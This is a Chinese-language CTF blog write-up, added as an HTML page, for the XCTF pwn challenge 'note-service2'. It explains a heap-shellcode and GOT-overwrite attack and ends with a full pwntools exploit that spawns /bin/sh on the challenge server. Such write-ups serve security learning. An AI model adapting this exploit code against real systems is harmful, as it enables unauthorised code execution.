@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="196082">
+    
+    <title>
+        
+            note-service2 |
+        
+        196082&#39;s blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/ufo.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"cv196082.gitee.io","root":"/","language":"zh-CN","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/batman.jpeg","favicon":"/images/ufo.ico","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.3"};
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 月前","year":"%s 年前"};
+  </script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                196082&#39;s blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">note-service2</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/batman.jpeg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">196082</span>
+                        
+                            <span class="author-label">CTO</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2021-10-29 20:57:47
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/pwn-xctf/">pwn-xctf</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E7%AF%A1%E6%94%B9got%E8%A1%A8/">篡改got表</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h2 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h2><p><img src="/images/image-20211029205958213.png" alt="image-20211029205958213"></p>
+<p>开启了canary和pie但是没有开启nx，所以堆栈可以执行</p>
+<h2 id="程序执行流程分析"><a href="#程序执行流程分析" class="headerlink" title="程序执行流程分析"></a>程序执行流程分析</h2><p>一道经典的菜单题目，具体流程可以看题目我在这里只放上有漏洞的代码</p>
+<p>有四个选项，一是增加note，二和三都还没完成，第四就是删掉note</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_CA5</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)dword_20209C;</span><br><span class="line">  <span class="keyword">if</span> ( dword_20209C &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)dword_20209C;</span><br><span class="line">    <span class="keyword">if</span> ( dword_20209C &lt;= <span class="number">11</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">      v1 = sub_B91();</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;size:&quot;</span>);</span><br><span class="line">      result = sub_B91();</span><br><span class="line">      v2 = result;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">int</span>)result &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">int</span>)result &lt;= <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        qword_2020A0[v1] = <span class="built_in">malloc</span>((<span class="keyword">int</span>)result);</span><br><span class="line">        <span class="keyword">if</span> ( !qword_2020A0[v1] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;malloc error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">        sub_B69(qword_2020A0[v1], v2);</span><br><span class="line">        result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)++dword_20209C;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在增加note的时候，首先输入索引值，然后创建一个chunk但是chunk的大小最大为8，又因为程序是堆栈可以执行所以考虑把shellcode写到堆当中。</p>
+<p>execve对应的系统调用号是59所以amd64的shellcode需要完成的操作是:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rax = 59</span><br><span class="line">rdi = &#x27;/bin/sh&#x27;</span><br><span class="line">rsi = 0</span><br><span class="line">rdx = 0</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+
+<p>这肯定是超过了8字节，所以需要创建多个chunk然后连接起来，通过jmp连接，当我们malloc一个大小为8的chunk的时候他的结构其实是这样</p>
+<p><img src="/images/image-20211029220854272.png" alt="image-20211029220854272"></p>
+<p>这样一个chunk里面只有fd的位置是我可以控制的，并且在我们可以控制的最后一个字节会被改写成0，所以我们实际可以控制的只有7个字节在构造的时候需要jmp的距离为bk+prev_size+size+1的大小。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000B1E                 jmp     short loc_B42</span><br><span class="line">.text:0000000000000B20 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000000B20</span><br><span class="line">.text:0000000000000B20 loc_B20:                                ; CODE XREF: sub_AC3+49↑j</span><br><span class="line">.text:0000000000000B20                 mov     eax, [rbp+var_C]</span><br><span class="line">.text:0000000000000B23                 movsxd  rdx, eax</span><br><span class="line">.text:0000000000000B26                 mov     rax, [rbp+var_18]</span><br><span class="line">.text:0000000000000B2A                 add     rdx, rax</span><br><span class="line">.text:0000000000000B2D                 movzx   eax, [rbp+buf]</span><br><span class="line">.text:0000000000000B31                 mov     [rdx], al</span><br><span class="line">.text:0000000000000B33                 add     [rbp+var_C], 1</span><br><span class="line">.text:0000000000000B37</span><br><span class="line">.text:0000000000000B37 loc_B37:                                ; CODE XREF: sub_AC3+2A↑j</span><br><span class="line">.text:0000000000000B37                 mov     eax, [rbp+var_1C]</span><br><span class="line">.text:0000000000000B3A                 sub     eax, 1</span><br><span class="line">.text:0000000000000B3D                 cmp     eax, [rbp+var_C]</span><br><span class="line">.text:0000000000000B40                 jg      short loc_AEF</span><br><span class="line">.text:0000000000000B42</span><br><span class="line">.text:0000000000000B42 loc_B42:  </span><br></pre></td></tr></table></figure>
+
+<p>之间相差0x24个字节但是十六进制当中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000000000000B10  F4 48 63 D0 48 8B 45 E8  48 01 D0 C6 00 00 EB 22  ....H.E.........</span><br></pre></td></tr></table></figure>
+
+<p>指令为0x22个字节，所以jmp short的跳跃数其实就是<code>目标地址-当前地址-jmp short的大小</code></p>
+<p>所以跳跃的距离实际计算方式是<code>bk+prev_size+size+1+2-2=0x19</code></p>
+<h2 id="分析利用方式"><a href="#分析利用方式" class="headerlink" title="分析利用方式"></a>分析利用方式</h2><p>有了上面的思路，就需要想怎么往rdi放入’/bin/sh’了可以看到这个函数atoi(nptr);调用方式跟system一样并且nptr是可控的，那么就可以想到是篡改got表了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">.got.plt:0000000000202060 off_202060      dq offset atoi          ; DATA XREF: _atoi↑r</span><br><span class="line">.got.plt:0000000000202068 off_202068      dq offset exit          ; DATA XREF: _exit↑r</span><br><span class="line">.got.plt:0000000000202068 _got_plt        ends</span><br><span class="line">.got.plt:0000000000202068</span><br><span class="line">.data:0000000000202070 ; ===========================================================================</span><br><span class="line">.data:0000000000202070</span><br><span class="line">.data:0000000000202070 ; Segment type: Pure data</span><br><span class="line">.data:0000000000202070 ; Segment permissions: Read/Write</span><br><span class="line">.data:0000000000202070 _data           segment qword public &#x27;DATA&#x27; use64</span><br><span class="line">.data:0000000000202070                 assume cs:_data</span><br><span class="line">.data:0000000000202070                 ;org 202070h</span><br><span class="line">.data:0000000000202070                 db    0</span><br><span class="line">.data:0000000000202071                 db    0</span><br><span class="line">.data:0000000000202072                 db    0</span><br><span class="line">.data:0000000000202073                 db    0</span><br><span class="line">.data:0000000000202074                 db    0</span><br><span class="line">.data:0000000000202075                 db    0</span><br><span class="line">.data:0000000000202076                 db    0</span><br><span class="line">.data:0000000000202077                 db    0</span><br><span class="line">.data:0000000000202078 ; void *off_202078</span><br><span class="line">.data:0000000000202078 off_202078      dq offset off_202078    ; DATA XREF: sub_A10+17↑r</span><br><span class="line">.data:0000000000202078                                         ; .data:off_202078↓o</span><br><span class="line">.data:0000000000202078 _data           ends</span><br><span class="line">.data:0000000000202078</span><br><span class="line">.bss:0000000000202080 ; ===========================================================================</span><br><span class="line">.bss:0000000000202080</span><br><span class="line">.bss:0000000000202080 ; Segment type: Uninitialized</span><br><span class="line">.bss:0000000000202080 ; Segment permissions: Read/Write</span><br><span class="line">.bss:0000000000202080 _bss            segment align_32 public &#x27;BSS&#x27; use64</span><br><span class="line">.bss:0000000000202080                 assume cs:_bss</span><br><span class="line">.bss:0000000000202080                 ;org 202080h</span><br><span class="line">.bss:0000000000202080                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing</span><br><span class="line">.bss:0000000000202080                 public __bss_start</span><br><span class="line">.bss:0000000000202080 ; FILE *_bss_start</span><br><span class="line">.bss:0000000000202080 __bss_start     dq ?                    ; DATA XREF: LOAD:0000000000000480↑o</span><br><span class="line">.bss:0000000000202080                                         ; LOAD:0000000000000498↑o ...</span><br><span class="line">.bss:0000000000202080                                         ; Alternative name is &#x27;_edata&#x27;</span><br><span class="line">.bss:0000000000202080                                         ; stdout</span><br><span class="line">.bss:0000000000202080                                         ; _edata</span><br><span class="line">.bss:0000000000202080                                         ; Copy of shared data</span><br><span class="line">.bss:0000000000202088                 align 10h</span><br><span class="line">.bss:0000000000202090                 public stdin</span><br><span class="line">.bss:0000000000202090 ; FILE *stdin</span><br><span class="line">.bss:0000000000202090 stdin           dq ?                    ; DATA XREF: LOAD:00000000000004C8↑o</span><br><span class="line">.bss:0000000000202090                                         ; sub_A80+4↑r</span><br><span class="line">.bss:0000000000202090                                         ; Copy of shared data</span><br><span class="line">.bss:0000000000202098 byte_202098     db ?                    ; DATA XREF: sub_A10↑r</span><br><span class="line">.bss:0000000000202098                                         ; sub_A10+29↑w</span><br><span class="line">.bss:0000000000202099                 align 4</span><br><span class="line">.bss:000000000020209C dword_20209C    dd ?                    ; DATA XREF: sub_CA5+8↑r</span><br><span class="line">.bss:000000000020209C                                         ; sub_CA5+16↑r ...</span><br><span class="line">.bss:00000000002020A0 ; _QWORD qword_2020A0[12]</span><br><span class="line">.bss:00000000002020A0 qword_2020A0    dq 0Ch dup(?)           ; DATA XREF: sub_BE0+18↑o</span><br></pre></td></tr></table></figure>
+
+<p>可以看到堆最开始的地方和我们需要修改的位置距离为0x40字节，最上面的漏洞函数里面数组的索引是没有检测的，那dword_20209C[-8]也就是atoi函数got表的内容，并且不能一开是就修改，因为我们后面写shellcode是还需要atoi函数的</p>
+<h3 id="shellcode写法"><a href="#shellcode写法" class="headerlink" title="shellcode写法"></a>shellcode写法</h3><p>在文章上面是写了我们要getshell需要的操作:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rax,59</span><br><span class="line">mov rsi,0</span><br><span class="line">mov rdx,0</span><br><span class="line">syscall</span><br><span class="line"># rdi由我们自己写用atoi写入</span><br></pre></td></tr></table></figure>
+
+<p>但是问题就出来了，上面的三条指令都已经是7字节了，所以我们需要将命令拆开</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xor rax,rax</span><br><span class="line">mov eax,59</span><br><span class="line">xor rsi,rsi</span><br><span class="line">xor rdx,rdx</span><br></pre></td></tr></table></figure>
+
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./questions/1f10c9df3d784b5ba04b205c1610a11e&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&#x27;111.200.241.244&#x27;</span>, <span class="number">57872</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./questions/1f10c9df3d784b5ba04b205c1610a11e&#x27;)</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span>(<span class="params">index, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice&gt;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(index), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;size:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">8</span>), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;content:&#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_note</span>(<span class="params">index</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice&gt;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(index), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code0 = asm(<span class="string">&#x27;xor rax,rax&#x27;</span>)+<span class="string">b&#x27;\x90\x90\xeb\x19&#x27;</span></span><br><span class="line">code1 = asm(<span class="string">&#x27;mov eax,0x3b&#x27;</span>)+<span class="string">b&#x27;\xeb\x19&#x27;</span></span><br><span class="line">code2 = asm(<span class="string">&#x27;xor rsi,rsi&#x27;</span>)+<span class="string">b&#x27;\x90\x90\xeb\x19&#x27;</span></span><br><span class="line">code3 = asm(<span class="string">&#x27;xor rdx,rdx&#x27;</span>)+<span class="string">b&#x27;\x90\x90\xeb\x19&#x27;</span></span><br><span class="line">code4 = asm(<span class="string">&#x27;syscall&#x27;</span>).ljust(<span class="number">7</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line"><span class="comment"># 这里\x90是nop指令</span></span><br><span class="line">add_note(<span class="number">0</span>, code0)</span><br><span class="line">add_note(<span class="number">1</span>, code1)</span><br><span class="line">add_note(<span class="number">2</span>, code2)</span><br><span class="line">add_note(<span class="number">3</span>, code3)</span><br><span class="line">add_note(<span class="number">4</span>, code4)</span><br><span class="line"></span><br><span class="line">del_note(<span class="number">0</span>)</span><br><span class="line">add_note(-<span class="number">8</span>, code0)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;your choice&gt;&gt; &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+        </div>
+
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2021/10/30/%E5%85%B3%E4%BA%8E-htaccess%E7%9A%84%E6%8A%80%E5%B7%A7%E8%AE%B0%E5%BD%95/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">关于.htaccess的技巧记录</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2021/10/27/pwn1/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">pwn1</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span>&nbsp;-&nbsp;
+            
+            2021&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">196082</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5%E4%BF%9D%E6%8A%A4"><span class="nav-text">检查保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="nav-text">程序执行流程分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-text">分析利用方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#shellcode%E5%86%99%E6%B3%95"><span class="nav-text">shellcode写法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-text">exp</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/dark-light-toggle.js"></script>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/code-copy.js"></script>
+
+
+
+
+<div class="post-scripts">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/toc.js"></script>
+    
+</div>
+
+
+
+</body>
+</html>
